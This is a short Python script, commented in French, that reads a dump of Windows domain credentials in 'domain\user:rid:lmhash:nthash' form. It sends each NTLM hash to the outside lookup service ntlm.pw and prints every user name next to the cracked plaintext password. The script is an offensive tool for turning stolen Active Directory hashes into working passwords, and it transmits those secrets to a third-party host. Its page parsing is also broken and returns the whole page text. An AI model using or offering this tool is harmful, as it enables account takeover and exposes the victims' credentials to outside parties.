import re
import requests
from bs4 import BeautifulSoup
 
def extract_users_and_hashes_from_file(file_path):
    with open(file_path, &apos;r&apos;) as file:
        lines = file.readlines()
    
    regex = re.compile(r&apos;(?P<domain>[^\\]+)\\(?P<user>[^:]+):\d+:[a-f0-9]{32}:(?P<ntlm_hash>[a-f0-9]{32})&apos;)
    
    users_and_hashes = []
    for line in lines:
        match = regex.search(line)
        if match:
            domain = match.group(&apos;domain&apos;)
            user = match.group(&apos;user&apos;)
            ntlm_hash = match.group(&apos;ntlm_hash&apos;)
            users_and_hashes.append({&apos;user&apos;: f"{domain}\\{user}", &apos;ntlm_hash&apos;: ntlm_hash})
    
    return users_and_hashes
 
def check_ntlm_hash(ntlm_hash):
    url = f"https://ntlm.pw/{ntlm_hash}"
    response = requests.get(url)
    soup = BeautifulSoup(response.content, &apos;html.parser&apos;)
    
    password_tag = soup
    if password_tag:
        password = password_tag.text.strip()
        return password
    return None
 
# Exemple d&apos;utilisation
file_path = &apos;data.txt&apos;
users_and_hashes = extract_users_and_hashes_from_file(file_path)
 
for entry in users_and_hashes:
    ntlm_hash = entry[&apos;ntlm_hash&apos;]
    password = check_ntlm_hash(ntlm_hash)
    if password:
        print(f"User: {entry[&apos;user&apos;]}, NTLM Hash: {ntlm_hash}, Password: {password}")
    else:
        print(f"User: {entry[&apos;user&apos;]}, NTLM Hash: {ntlm_hash}, Password: Not found")
